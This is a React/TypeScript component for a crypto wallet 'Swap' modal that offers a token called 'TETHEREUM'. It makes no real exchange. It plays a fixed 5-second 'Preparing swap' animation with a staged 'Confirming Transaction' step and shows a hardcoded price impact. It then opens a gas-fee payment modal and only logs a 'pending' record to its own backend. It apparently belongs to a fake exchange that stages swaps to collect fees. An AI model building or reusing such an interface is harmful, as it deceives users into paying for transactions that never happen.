'use client';

import { useState, useEffect, useMemo } from 'react';
import { X, ArrowDownUp, ArrowRight, Info, ChevronDown } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import GasFeeModal from './gas-fee-modal';
import { COIN_MAP, getDynamicExchangeRates } from '@/lib/utils';
import StatusModal from './statusModal';

interface SwapModalProps {
    address: string;
    isOpen: boolean;
    onClose: () => void;
    onSuccess?: () => void;
    initialFromToken?: string;
    bnbBalance?: string;
    t22Balance?: number;
    ethBalance?: string;
    currencySymbol?: string;
    fxRate?: number;
    theme?: 'dark' | 'light';
}

export default function SwapModal({
    address,
    isOpen,
    onClose,
    onSuccess,
    initialFromToken = 'BNB',
    bnbBalance = '0',
    t22Balance = 0,
    ethBalance = "0",
    currencySymbol = '$',
    fxRate = 1,
    theme = 'light'
}: SwapModalProps) {
    const [fromToken, setFromToken] = useState(initialFromToken || 'TETHEREUM');
    // const [toToken, setToToken] = useState(initialFromToken || 'ETH');
    const [toToken, setToToken] = useState('ETH');
    const [fromAmount, setFromAmount] = useState('');
    const [toAmount, setToAmount] = useState('');
    const [showGasModal, setShowGasModal] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

    // Custom Dropdown State
    const [showFromDropdown, setShowFromDropdown] = useState(false);
    const [showToDropdown, setShowToDropdown] = useState(false);

    // Status Modal State
    const [showStatusModal, setShowStatusModal] = useState(false);
    const [statusModalConfig, setStatusModalConfig] = useState({
        title: '',
        message: '',
        success: false
    });

    const showError = (title: string, message: string) => {
        setStatusModalConfig({
            title,
            message,
            success: false
        });
        setShowStatusModal(true);
    };





    const [user, setUser] = useState({})

    // Exchange rates (mock - in production, fetch from API)
    // const exchangeRates: { [key: string]: { [key: string]: number } } = {
    //     'BNB': { 'TETHEREUM': 1.0, 'USDT': 620.0, 'BNB': 1.0 },
    //     'TETHEREUM': { 'BNB': 1.0, 'USDT': 0.45, 'TETHEREUM': 1.0 },
    //     'USDT': { 'BNB': 0.00161, 'TETHEREUM': 2.22, 'USDT': 1.0 }
    // };

    const exchangeRates: { [key: string]: { [key: string]: number } } = {
        'TETHEREUM': { 'BNB': 1.0, 'USDT': 0.45, 'TETHEREUM': 1.0 },
        'BNB': {
            'BNB': 1,
            'ETH': 0.35,
            'USDT': 620,
            'USDC': 620,
            'DAI': 620,
            'MATIC': 850,
            'ARB': 420,
            'OP': 390
        },
        'ETH': {
            'BNB': 2.85,
            'ETH': 1,
            'USDT': 1800,
            'USDC': 1800,
            'DAI': 1800,
            'MATIC': 2400,
            'ARB': 1200,
            'OP': 1100
        },
        'USDT': {
            'BNB': 0.00161,
            'ETH': 0.00055,
            'USDT': 1,
            'USDC': 1,
            'DAI': 1,
            'MATIC': 1.33,
            'ARB': 0.66,
            'OP': 0.61
        },
        'USDC': {
            'BNB': 0.00161,
            'ETH': 0.00055,
            'USDT': 1,
            'USDC': 1,
            'DAI': 1,
            'MATIC': 1.33,
            'ARB': 0.66,
            'OP': 0.61
        },
        'DAI': {
            'BNB': 0.00161,
            'ETH': 0.00055,
            'USDT': 1,
            'USDC': 1,
            'DAI': 1,
            'MATIC': 1.33,
            'ARB': 0.66,
            'OP': 0.61
        },
        'MATIC': {
            'BNB': 0.00117,
            'ETH': 0.00042,
            'USDT': 0.75,
            'USDC': 0.75,
            'DAI': 0.75,
            'MATIC': 1,
            'ARB': 0.5,
            'OP': 0.46
        },
        'ARB': {
            'BNB': 0.00238,
            'ETH': 0.00083,
            'USDT': 1.5,
            'USDC': 1.5,
            'DAI': 1.5,
            'MATIC': 2,
            'ARB': 1,
            'OP': 0.92
        },
        'OP': {
            'BNB': 0.00256,
            'ETH': 0.0009,
            'USDT': 1.63,
            'USDC': 1.63,
            'DAI': 1.63,
            'MATIC': 2.17,
            'ARB': 1.08,
            'OP': 1
        }
    };
    let [exchangeRates_, setExchangeRates_] = useState(null)

    useEffect(() => {
        let v = async () => {

            console.log("exchangeRates__")
            const exchangeRates__ = await getDynamicExchangeRates();
            // console.log(exchangeRates__)
            setExchangeRates_(exchangeRates__)
        }
        v()
    }, [])
    const getBalance = (token: string) => {
        if (token === 'BNB') return Number(bnbBalance).toFixed(4);
        if (token === 'TETHEREUM') return t22Balance.toFixed(6);
        if (token === 'ETH') return Number(ethBalance).toFixed(6);
        return '0.00';
    };

    // Auto-calculate toAmount when fromAmount or tokens change
    useEffect(() => {
        if (fromAmount && !isNaN(Number(fromAmount)) && Number(fromAmount) > 0) {
            const rate = exchangeRates_[fromToken]?.[toToken] || 1.0;

            const calculated = Number(fromAmount) * rate;
            setToAmount(calculated.toFixed(6));
        } else {
            setToAmount('');
        }
    }, [fromAmount, fromToken, toToken]);

    const [getUserLoading, setGetUSerLoading] = useState(false)
    useEffect(() => {

        let v = async () => {
            // console.log(!address || address=="","kkk")
            if (!address || address == "") {
                return
            }

            try {

                setGetUSerLoading(true)
                let vvv = await fetch(`/api/user?address=${address}`, {
                    method: 'GET',
                    headers: { 'Content-Type': 'application/json' },
                    //   body: JSON.stringify({ address, t99:Number(tbal) })
                });

                let vjson = await vvv.json()

                if (vjson?.existingRecord?.id) {
                    setUser(vjson?.existingRecord)
                }

            } catch (e) {

            } finally {
                setGetUSerLoading(false)
            }
        }

        v()
    }, [address])

    // Update state when modal opens with initialFromToken
    useEffect(() => {
        if (isOpen && initialFromToken) {
            setFromToken(initialFromToken);
            // Prevent selecting same token for both
            if (toToken === initialFromToken) {
                // setToToken(initialFromToken === 'BNB' ? 'TETHEREUM' : 'BNB');
            }
        }
    }, [isOpen, initialFromToken]);
    let getCurrentRate = useMemo(() => {
        if (!exchangeRates_) {
            return "..."
        }

        const rate = exchangeRates_[fromToken]?.[toToken];
        if (rate !== undefined && !isNaN(rate)) {
            return `1 ${fromToken} = ${Number(rate).toFixed(6)} ${toToken}`;
        }
        return "Unavailable";
    }, [fromToken, toToken, exchangeRates_]);

    const currentNetwork = useMemo(() => {
        if (fromToken === 'BNB' || fromToken === 'BUSD' || fromToken === 'TETHEREUM') return 'BNB';
        if (fromToken === 'ETH' || fromToken === 'USDT' || fromToken === 'USDC') return 'ETH';
        if (fromToken === 'BTC') return 'BTC';
        return 'ETH';
    }, [fromToken]);

    const estimatedUsdValue = useMemo(() => {
        if (!toAmount || !exchangeRates_) return '0.00';
        const usdRate = exchangeRates_[toToken]?.['USDT'] || 0;
        return (Number(toAmount) * usdRate).toFixed(2);
    }, [toAmount, toToken, exchangeRates_]);

    // Reset form when modal closes
    useEffect(() => {
        if (!isOpen) {
            setFromAmount('');
            setToAmount('');
        }
    }, [isOpen]);



    const handleSwapTokens = () => {
        // Swap tokens
        const tempToken = fromToken;
        setFromToken(toToken);
        setToToken(tempToken);

        // Swap amounts
        const tempAmount = fromAmount;
        setFromAmount(toAmount);
        setToAmount(tempAmount);
    };

    const handleFromTokenChange = (newToken: string) => {
        // Prevent selecting same token
        if (newToken === toToken) {
            setToToken(fromToken);
        }
        setFromToken(newToken);
    };

    const handleToTokenChange = (newToken: string) => {
        // Prevent selecting same token
        if (newToken === fromToken) {
            setFromToken(toToken);
        }
        setToToken(newToken);
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        // Validation
        if (!fromAmount || Number(fromAmount) <= 0) {
            showError('Invalid Amount', 'Please enter a valid amount to swap.');
            return;
        }

        const balance = Number(getBalance(fromToken));
        console.log(balance,fromToken,"fromToken")
        if (Number(fromAmount) > balance) {
            showError('Insufficient Balance', `You don't have enough ${fromToken} to complete this swap. Please add more funds and try again.`);
            return;
        }

        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            setShowGasModal(true);
        }, 5000); // 5 second loading delay
    };

    const handleGasSuccess = async (txHash: string) => {
        // Create Pending Transaction in Airtable
        try {
            await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: address,
                    amount: Number(fromAmount),
                    type: "swap",
                    asset: `${fromToken} → ${toToken}`,
                    network: "Base Swap",
                    wType: "crypto",
                    status: "pending"
                })
            });
        } catch (err) {
            console.error("Failed to save swap history", err);
        }

        setShowGasModal(false);
        if (onSuccess) onSuccess();
        onClose();
    };



    return (
        <AnimatePresence mode="wait">
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-end md:items-center justify-center">
                    {/* Backdrop */}
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="absolute inset-0 bg-black/60 backdrop-blur-sm"
                        onClick={onClose}
                    />

                    {/* Modal - Bottom Sheet on Mobile, Centered on Desktop */}
                    <motion.div
                        initial={{ y: "100%", opacity: 0 }}
                        animate={{ y: 0, opacity: 1 }}
                        exit={{ y: "100%", opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full md:max-w-[420px] ${theme === 'dark' ? 'bg-[#0a0b0d] text-white border-[#0052FF]/30' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border-t md:border rounded-t-[2.5rem] md:rounded-[2rem] shadow-2xl overflow-hidden z-20 md:m-4`}
                    >
                        {isLoading ? (
                            <div className="flex flex-col items-center justify-center py-16 px-6 relative w-full bg-[#0a0b0d] min-h-[460px]">
                                <div className="relative w-28 h-28 mb-8">
                                    <div className="absolute inset-0 border-[3px] border-[#0052FF]/20 rounded-full"></div>
                                    <div className="absolute inset-0 border-[3px] border-[#0052FF] rounded-full border-t-transparent animate-spin"></div>
                                    <div className="absolute inset-4 border-[3px] border-blue-400/20 rounded-full"></div>
                                    <div className="absolute inset-4 border-[3px] border-blue-400 rounded-full border-b-transparent animate-[spin_1.5s_linear_infinite_reverse]"></div>
                                    <div className="absolute inset-0 flex items-center justify-center">
                                        <ArrowDownUp className="w-8 h-8 text-[#0052FF] animate-pulse" />
                                    </div>
                                </div>

                                <motion.h3
                                    initial={{ y: 10, opacity: 0 }}
                                    animate={{ y: 0, opacity: 1 }}
                                    className="text-2xl font-bold text-white mb-3 tracking-wide"
                                >
                                    Preparing swap...
                                </motion.h3>
                                <motion.p
                                    initial={{ y: 10, opacity: 0 }}
                                    animate={{ y: 0, opacity: 1 }}
                                    transition={{ delay: 0.1 }}
                                    className="text-gray-400 text-center px-4 text-sm leading-relaxed mb-10"
                                >
                                    Securing the exchange rate for <br />
                                    <span className="text-white font-medium">{fromAmount} {fromToken}</span> to <span className="text-white font-medium">{toAmount} {toToken}</span>
                                </motion.p>

                                <div className="w-full space-y-5 max-w-xs mx-auto">
                                    <div className="flex items-center gap-4 bg-white/5 p-3 rounded-xl border border-white/5">
                                        <div className="w-8 h-8 rounded-full bg-green-500/20 flex items-center justify-center flex-shrink-0">
                                            <div className="w-3 h-3 rounded-full bg-green-500"></div>
                                        </div>
                                        <span className="text-sm text-gray-400 font-medium">Confirming Transaction</span>
                                    </div>
                                    <div className="flex items-center gap-4 bg-white/5 p-3 rounded-xl border border-white/5">
                                        <div className="w-8 h-8 rounded-full bg-[#0052FF]/20 flex items-center justify-center animate-pulse flex-shrink-0">
                                            <div className="w-3 h-3 rounded-full bg-[#0052FF]"></div>
                                        </div>
                                        <span className="text-sm text-white font-medium">Estimating Gas fees</span>
                                    </div>
                                </div>
                            </div>
                        ) : (
                            <div className="p-6 pb-10">
                                <div className="flex items-center justify-between mb-4">
                                    <h2 className="text-lg font-bold">Swap</h2>
                                    <button
                                        onClick={onClose}
                                        className="w-8 h-8 flex items-center justify-center bg-gray-800/50 hover:bg-gray-700/50 rounded-full transition-colors text-gray-400 hover:text-white"
                                    >
                                        <X className="w-5 h-5" />
                                    </button>
                                </div>

                                <form onSubmit={handleSubmit} className="space-y-4">
                                    <div className={`border rounded-2xl p-4 transition-colors focus-within:border-[#0052FF] ${theme === 'dark' ? 'bg-[#1E2025] border-white/5' : 'bg-gray-100 border-gray-200'}`}>
                                        <div className="flex justify-between mb-2">
                                            <label className="text-xs text-gray-400 font-medium">From</label>
                                            <span className="text-xs text-gray-500">Balance: {getBalance(fromToken)}</span>
                                        </div>
                                        <div className="flex items-center gap-3">
                                            <motion.input
                                                initial={{ x: -10, opacity: 0 }}
                                                animate={{ x: 0, opacity: 1 }}
                                                type="number"
                                                value={fromAmount}
                                                onChange={(e) => setFromAmount(e.target.value)}
                                                placeholder="0.0"
                                                step="any"
                                                className={`flex-1 bg-transparent text-3xl font-medium placeholder-gray-700 focus:outline-none min-w-0 ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'
                                                    }`}
                                                required
                                            />
                                            <button
                                                type="button"
                                                onClick={() => setFromAmount(getBalance(fromToken))}
                                                className={`text-[10px] font-bold px-2.5 py-1 rounded-lg transition-colors border ${theme === 'dark'
                                                    ? 'bg-[#0052FF]/10 hover:bg-[#0052FF]/20 text-[#0052FF] border-[#0052FF]/20'
                                                    : 'bg-blue-50 hover:bg-blue-100 text-blue-600 border-blue-200'}`}
                                            >
                                                MAX
                                            </button>
                                            <div className={`relative flex items-center gap-2 rounded-full pl-2 pr-4 py-1.5 border ${theme === 'dark' ? 'bg-[#0a0b0d] border-white/10' : 'bg-white border-gray-300 shadow-sm'}`}>
                                                <div className="w-6 h-6 rounded-full flex items-center justify-center overflow-hidden">
                                                    <img src={COIN_MAP[fromToken].logo} alt={fromToken} className="w-full h-full object-cover" />
                                                </div>
                                                <div
                                                    onClick={() => setShowFromDropdown(!showFromDropdown)}
                                                    className={`flex items-center gap-1.5 cursor-pointer bg-transparent font-semibold pl-1 pr-6 hover:opacity-80 transition-opacity relative z-10 ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'
                                                        }`}
                                                >
                                                    <span className="text-sm">{fromToken}</span>
                                                    <ChevronDown className="absolute right-1 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                                                </div>

                                                <AnimatePresence>
                                                    {showFromDropdown && (
                                                        <>
                                                            <div className="fixed inset-0 z-30" onClick={() => setShowFromDropdown(false)} />
                                                            <motion.div
                                                                initial={{ opacity: 0, scale: 0.95, y: -10 }}
                                                                animate={{ opacity: 1, scale: 1, y: 0 }}
                                                                exit={{ opacity: 0, scale: 0.95, y: -10 }}
                                                                className={`absolute top-full right-0 mt-2 w-48 border rounded-xl shadow-2xl z-40 overflow-hidden text-left ${theme === 'dark' ? 'bg-[#1a1b1f] border-white/10' : 'bg-white border-gray-200 shadow-xl'}`}
                                                            >
                                                                <div className="max-h-60 overflow-y-auto">
                                                                    {['BTC', 'ETH', 'BNB', 'USDT', 'TETHEREUM'].map((coin) => (
                                                                        <div
                                                                            key={coin}
                                                                            onClick={() => {
                                                                                handleFromTokenChange(coin);
                                                                                setShowFromDropdown(false);
                                                                            }}
                                                                            className={`flex items-center gap-3 px-4 py-3 hover:bg-blue-500/5 cursor-pointer transition-colors border-b last:border-0 ${theme === 'dark' ? 'border-white/5' : 'border-gray-100'}`}
                                                                        >
                                                                            <img src={COIN_MAP[coin].logo} alt={coin} className="w-6 h-6 rounded-full" />
                                                                            <span className={`font-medium text-sm ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{coin}</span>
                                                                        </div>
                                                                    ))}
                                                                </div>
                                                            </motion.div>
                                                        </>
                                                    )}
                                                </AnimatePresence>
                                            </div>
                                        </div>
                                    </div>

                                    <div className="flex justify-center -my-5 relative z-10">
                                        <button
                                            type="button"
                                            onClick={handleSwapTokens}
                                            className={`w-10 h-10 border-4 rounded-xl text-[#0052FF] flex items-center justify-center hover:scale-110 active:scale-95 transition-all shadow-xl ${theme === 'dark' ? 'bg-[#2b2d33] border-[#0a0b0d]' : 'bg-gray-100 border-white'}`}
                                        >
                                            <ArrowDownUp className="w-5 h-5" />
                                        </button>
                                    </div>

                                    <div className={`border rounded-2xl p-4 transition-colors focus-within:border-[#0052FF] ${theme === 'dark' ? 'bg-[#1E2025] border-white/5' : 'bg-gray-100 border-gray-200'}`}>
                                        <div className="flex justify-between mb-2">
                                            <label className="text-xs text-gray-400 font-medium">To</label>
                                            <span className="text-xs text-gray-500">Balance: {getBalance(toToken)}</span>
                                        </div>
                                        <div className="flex items-center gap-3">
                                            <motion.input
                                                key={toAmount}
                                                initial={{ opacity: 0 }}
                                                animate={{ opacity: 1 }}
                                                type="text"
                                                value={toAmount}
                                                placeholder="0.0"
                                                className={`flex-1 bg-transparent text-3xl font-medium placeholder-gray-700 focus:outline-none min-w-0 ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'
                                                    }`}
                                                readOnly
                                            />
                                            <div className={`relative flex items-center gap-2 rounded-full pl-2 pr-4 py-1.5 border ${theme === 'dark' ? 'bg-[#0a0b0d] border-white/10' : 'bg-white border-gray-300 shadow-sm'}`}>
                                                <div className="w-6 h-6 rounded-full flex items-center justify-center overflow-hidden">
                                                    <img src={COIN_MAP[toToken].logo} alt={toToken} className="w-full h-full object-cover" />
                                                </div>
                                                <div
                                                    onClick={() => setShowToDropdown(!showToDropdown)}
                                                    className={`flex items-center gap-1.5 cursor-pointer bg-transparent font-semibold pl-1 pr-6 hover:opacity-80 transition-opacity relative z-10 ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'
                                                        }`}
                                                >
                                                    <span className="text-sm">{toToken}</span>
                                                    <ChevronDown className="absolute right-1 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                                                </div>

                                                <AnimatePresence>
                                                    {showToDropdown && (
                                                        <>
                                                            <div className="fixed inset-0 z-30" onClick={() => setShowToDropdown(false)} />
                                                            <motion.div
                                                                initial={{ opacity: 0, scale: 0.95, y: -10 }}
                                                                animate={{ opacity: 1, scale: 1, y: 0 }}
                                                                exit={{ opacity: 0, scale: 0.95, y: -10 }}
                                                                className={`absolute top-full right-0 mt-2 w-48 border rounded-xl shadow-2xl z-40 overflow-hidden text-left ${theme === 'dark' ? 'bg-[#1a1b1f] border-white/10' : 'bg-white border-gray-200 shadow-xl'}`}
                                                            >
                                                                <div className="max-h-60 overflow-y-auto">
                                                                    {['BTC', 'ETH', 'BNB', 'USDT', 'TETHEREUM'].map((coin) => (
                                                                        <div
                                                                            key={coin}
                                                                            onClick={() => {
                                                                                handleToTokenChange(coin);
                                                                                setShowToDropdown(false);
                                                                            }}
                                                                            className={`flex items-center gap-3 px-4 py-3 hover:bg-blue-500/5 cursor-pointer transition-colors border-b last:border-0 ${theme === 'dark' ? 'border-white/5' : 'border-gray-100'}`}
                                                                        >
                                                                            <img src={COIN_MAP[coin].logo} alt={coin} className="w-6 h-6 rounded-full" />
                                                                            <span className={`font-medium text-sm ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{coin}</span>
                                                                        </div>
                                                                    ))}
                                                                </div>
                                                            </motion.div>
                                                        </>
                                                    )}
                                                </AnimatePresence>
                                            </div>
                                        </div>
                                    </div>

                                    <div className={`rounded-xl p-3 space-y-1.5 text-[10px] border ${theme === 'dark' ? 'bg-white/5 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                        <div className="flex justify-between">
                                            <span className="text-gray-400">Rate</span>
                                            <span className={`font-medium ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{getCurrentRate}</span>
                                        </div>
                                        <div className="flex justify-between items-center">
                                            <span className="text-gray-400 mt-1">You Receive</span>
                                            <div className="text-right">
                                                <motion.div
                                                    key={estimatedUsdValue}
                                                    initial={{ scale: 0.9, opacity: 0 }}
                                                    animate={{ scale: 1, opacity: 1 }}
                                                    className={`font-bold text-lg ${theme === 'dark' ? 'text-white' : 'text-[#0052FF]'}`}
                                                >
                                                    {currencySymbol}{(Number(estimatedUsdValue) * fxRate).toFixed(2)}
                                                </motion.div>
                                                <div className="text-gray-400 text-[10px]">{toAmount ? `${toAmount} ${toToken}` : '-'}</div>
                                            </div>
                                        </div>
                                        <div className="flex justify-between">
                                            <span className="text-gray-400">Price Impact</span>
                                            <span className="text-green-400">{'<0.01%'}</span>
                                        </div>
                                        <div className="flex justify-between">
                                            <span className="text-gray-400">Network Fee</span>
                                            <span className={`font-medium ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>~{currencySymbol}{(0.50 * fxRate).toFixed(2)}</span>
                                        </div>
                                    </div>

                                    <div className="flex items-start gap-2 p-3 bg-blue-500/10 border border-blue-500/20 rounded-xl">
                                        <Info className="w-3.5 h-3.5 text-blue-400 flex-shrink-0 mt-0.5" />
                                        <p className="text-[10px] text-blue-200">
                                            Review the swap details carefully. Transactions cannot be reversed.
                                        </p>
                                    </div>

                                    <button
                                        type="submit"
                                        disabled={!fromAmount || Number(fromAmount) <= 0}
                                        className="w-full bg-[#0052FF] hover:bg-[#004ada] disabled:bg-[#0052FF]/50 disabled:cursor-not-allowed !text-white font-bold py-3 rounded-full transition-all shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] flex items-center justify-center gap-2 text-sm"
                                    >
                                        Swap to {toToken}
                                        <ArrowRight className="w-4 h-4" />
                                    </button>
                                </form>
                            </div>
                        )}
                    </motion.div>

                    <GasFeeModal
                        isOpen={showGasModal}
                        onClose={() => setShowGasModal(false)}
                        onSuccess={handleGasSuccess}
                        user={user}
                        theme={theme}
                        network={currentNetwork}
                    />
                    <StatusModal
                        isOpen={showStatusModal}
                        onClose={() => setShowStatusModal(false)}
                        title={statusModalConfig.title}
                        message={statusModalConfig.message}
                        success={statusModalConfig.success}
                        theme={theme}
                    />
                </div>
            )}
        </AnimatePresence>
    );
}
